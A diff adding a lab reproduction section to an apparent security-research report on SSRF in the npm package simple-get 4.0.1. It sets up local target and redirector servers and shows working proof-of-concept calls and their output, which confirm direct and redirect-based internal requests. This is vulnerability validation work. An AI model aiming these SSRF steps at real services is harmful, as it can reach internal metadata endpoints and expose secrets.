@@ -60,4 +60,69 @@ The redirect handler follows 3xx responses to an attacker-controlled `Location` 
 
 ---
 
+---
+
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/npm-simple-get/`
+
+**Pinned version:** simple-get 4.0.1
+
+### Steps
+
+1. **Install the package:**
+   ```bash
+   npm install simple-get@4.0.1
+   ```
+
+2. **Start two local servers:**
+   - **Target server** on port 4444 simulating a cloud metadata endpoint:
+     ```javascript
+     http.createServer((req, res) => {
+       res.end('INTERNAL-METADATA-169.254.169.254: flag=secret-data');
+     }).listen(4444);
+     ```
+   - **Redirector** on port 4445 that sends a 302 to the target:
+     ```javascript
+     http.createServer((req, res) => {
+       res.writeHead(302, { Location: 'http://127.0.0.1:4444/metadata' });
+       res.end();
+     }).listen(4445);
+     ```
+
+3. **Test SG-01 (direct SSRF):**
+   ```javascript
+   const get = require('simple-get');
+   get.concat('http://127.0.0.1:4444/internal-direct', (err, res, data) => {
+     console.log(data.toString()); // -> INTERNAL-METADATA-169.254.169.254: flag=secret-data
+   });
+   ```
+
+4. **Test SG-02 (redirect-based SSRF):**
+   ```javascript
+   get.concat('http://127.0.0.1:4445/goto', (err, res, data) => {
+     console.log(data.toString()); // -> INTERNAL-METADATA (followed redirect to internal IP)
+   });
+   ```
+
+### Observed output (from `targets/labs/npm-simple-get/results.txt`)
+
+```
+simple-get PoC -- version: 4.0.1
+
+=== SG-01: SSRF via direct internal URL ===
+  SG-01 RESULT: status=200 body=INTERNAL-METADATA-169.254.169.254: flag=secret-data
+  >>> SG-01 CONFIRMED: simple-get reached internal 127.0.0.1 <<<
+
+=== SG-02: SSRF via redirect to internal URL ===
+  SG-02 RESULT: status=200 body=INTERNAL-METADATA-169.254.169.254: flag=secret-data
+  >>> SG-02 CONFIRMED: redirect followed to internal IP <<<
+```
+
+### Verdict
+
+**CONFIRMED.** Both direct SSRF and redirect-based SSRF work. The library performs zero URL validation and follows redirects to internal IPs without re-checking the destination.
+
+---
+
 **Pipeline:** 6 raw findings → 2 confirmed (2 HIGH breachable)
